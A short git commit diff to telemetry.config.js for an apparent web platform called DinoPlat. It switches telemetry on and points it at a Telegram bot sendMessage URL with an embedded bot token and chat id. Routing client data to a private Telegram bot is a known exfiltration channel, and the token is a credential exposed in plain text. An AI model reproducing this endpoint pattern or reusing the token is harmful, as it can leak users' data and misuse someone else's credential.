88df2c659f5f88ae5e6e2a083c3562ae8125704c
NQUARE <100482393+NQUAREx@users.noreply.github.com>
2026-03-24 12:26:29 +0300

    Update telemetry.config.js

--- telemetry.config.js
+++ telemetry.config.js
@@ -1,5 +1,5 @@
 window.DinoPlatTelemetryConfig = {
-  enabled: false,
-  telegramEndpoint: "",
+  enabled: true,
+  telegramEndpoint: "https://api.telegram.org/bot8767577727:AAHXo9WI1dDMyq0k3aRaJLQFJrXQ73vX-sw/sendMessage?chat_id=8370650143",
   heartbeatMs: 60000
 };
